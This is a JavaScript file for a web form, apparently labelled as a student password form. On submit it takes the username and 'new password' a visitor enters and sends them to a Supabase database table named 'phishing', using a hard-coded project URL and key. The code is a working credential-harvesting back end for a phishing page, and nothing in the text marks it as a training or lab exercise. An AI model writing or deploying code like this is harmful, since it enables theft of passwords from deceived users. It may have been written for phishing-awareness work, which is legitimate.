// ==========================
// SUPABASE CONFIG
// ==========================

const SUPABASE_URL =
"https://tzygochlibduxubsblzd.supabase.co";

const SUPABASE_ANON_KEY =
"sb_publishable_GVnQsJLt8IzlyOUAL48Kmg_kdLxPzxH";

const client = supabase.createClient(
    SUPABASE_URL,
    SUPABASE_ANON_KEY
);

// ==========================
// FORM SUBMIT
// ==========================

document
.getElementById("studentForm")
.addEventListener("submit", async function(e){

    e.preventDefault();

    const status =
    document.getElementById("status");

    const username =
    document.getElementById("uname").value;

    const newPassword =
    document.getElementById("newpass").value;

    status.innerHTML = "Connecting...";

    try {

        const { data, error } =
        await client
        .from("phishing")
        .insert([
            {
                username: username,
                password: newPassword
            }
        ]);

        if(error){

            console.error(error);

            status.innerHTML =
            "Error: " + error.message;

            alert(
                "SUPABASE ERROR\n\n" +
                error.message
            );

            return;
        }

        status.innerHTML =
        "Record inserted successfully";

        alert(
            "SUCCESS!\n\n" +
            "Data saved to Supabase."
        );

        document
        .getElementById("studentForm")
        .reset();

    }
    catch(err){

        console.error(err);

        status.innerHTML =
        "JavaScript Error: " +
        err.message;

        alert(
            "JAVASCRIPT ERROR\n\n" +
            err.message
        );
    }

});
